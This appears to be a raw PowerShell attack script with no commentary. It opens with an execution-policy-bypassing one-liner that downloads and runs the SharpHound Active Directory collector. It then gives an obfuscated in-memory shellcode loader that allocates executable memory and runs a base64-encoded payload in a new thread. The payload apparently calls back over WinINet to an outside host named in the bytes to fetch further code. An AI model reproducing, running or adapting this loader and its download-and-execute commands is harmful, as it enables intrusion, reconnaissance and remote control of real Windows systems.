powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"


function qyLUc {
        Param ($vpQa, $tR)
        $yYS = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $yYS.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($yYS.GetMethod('GetModuleHandle')).Invoke($null, @($vpQa)))), $tR))
}

function qtZSw {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $h2D,
                [Parameter(Position = 1)] [Type] $tsqlC = [Void]
        )

        $iCLdu = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $iCLdu.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $h2D).SetImplementationFlags('Runtime, Managed')
        $iCLdu.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $tsqlC, $h2D).SetImplementationFlags('Runtime, Managed')

        return $iCLdu.CreateType()
}

[Byte[]]$zaK5 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBIi1IYSItSIFFWSA+3SkpIi3JQTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBQi0gYSQHQ41ZI/8lNMclBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6BgAAABubWFwLXZtLnNlY3VyYS10ZXN0LmNvbQBaSInBScfAuwEAAE0xyVNTagNTSbpXiZ/GAAAAAP/V6MgAAAAvNGgyV2ZrWkpsbjctWGY5Zm15V01wQVVZRWxLTmhQM0FVdDJMT3ZqajNySDB5dHpoRU91SW53VE5BdDd3eDNWNmRVR29LQWVlbW9PWVF5NjJkNkE2Zjhnc0FfU1A2YmZfbmhzQk9kUkxKT2I0U2phd1UwYVdHVGtlMlBqQkp1ckI5dTJwN0tZTjYydmttX3VUdU9KU0FVTFltdDZCdUJuUEM4U1RMWDJYUzNNbjV5ZlZNZWxiQjFqYTR5Q3MwRzJhYzg4ZmlzAEiJwVNaQVhNMclTSLgAMqiEAAAAAFBTU0nHwutVLjv/1UiJxmoKX0iJ8WofWlJogDMAAEmJ4GoEQVlJunVGnoYAAAAA/9VNMcBTWkiJ8U0xyU0xyVNTScfCLQYYe//VhcB1H0jHwYgTAABJukTwNeAAAAAA/9VI/890Auuq6FUAAABTWWpAWkmJ0cHiEEnHwAAQAABJulikU+UAAAAA/9VIk1NTSInnSInxSInaScfAACAAAEmJ+Um6EpaJ4gAAAAD/1UiDxCCFwHSyZosHSAHDhcB10ljDWGoAWUnHwvC1olb/1Q==")
[Uint32]$qpL = 0
$goF7M = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qyLUc kernel32.dll VirtualAlloc), (qtZSw @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $zaK5.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($zaK5, 0, $goF7M, $zaK5.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qyLUc kernel32.dll VirtualProtect), (qtZSw @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($goF7M, [Uint32]$zaK5.Length, 0x10, [Ref]$qpL)) -eq $true) {
        $u74C = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qyLUc kernel32.dll CreateThread), (qtZSw @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$goF7M,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((qyLUc kernel32.dll WaitForSingleObject), (qtZSw @([IntPtr], [Int32]))).Invoke($u74C,0xffffffff) | Out-Null
}
